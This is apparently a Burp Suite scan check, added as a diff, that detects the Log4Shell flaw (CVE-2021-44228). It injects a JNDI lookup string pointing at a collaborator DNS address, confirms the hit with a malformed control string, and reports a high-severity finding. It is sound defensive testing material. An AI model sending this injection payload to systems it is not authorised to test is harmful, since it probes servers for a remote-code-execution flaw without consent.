@@ -1,0 +1,31 @@
+metadata:
+    language: v1-beta
+    name: "Log4Shell (collaborator)"
+    description: "Tests for the Log4Shell vulnerability"
+    author: "Carlos Montoya"
+    tags: "log4Shell", "CVE-2021-44228", "cve"
+
+define:
+    log4shell = `$\{jndi:dns://{generate_collaborator_address()}/a}`
+    not4shell = `$\{jmdi:dxns://{generate_collaborator_address()}/a}`
+    issueDetail = "The collaborator payload {log4shell} was added to a query parameter and several headers. This resulted in an interaction with the Burp collaborator."
+    issueRemediation = "Make sure you are up to date with patches and follow the remediation for CVE-2021-44228."
+
+given insertion point then
+    if not(dns interactions) then
+        send payload:
+            appending: {log4shell}
+
+        if dns interactions then
+            send payload:
+            appending: {not4shell}
+
+            if not(dns interactions) then
+                report issue:
+                    severity: high
+                    confidence: firm
+                    detail: {issueDetail}
+                    remediation: {issueRemediation}
+            end if
+        end if
+    end if
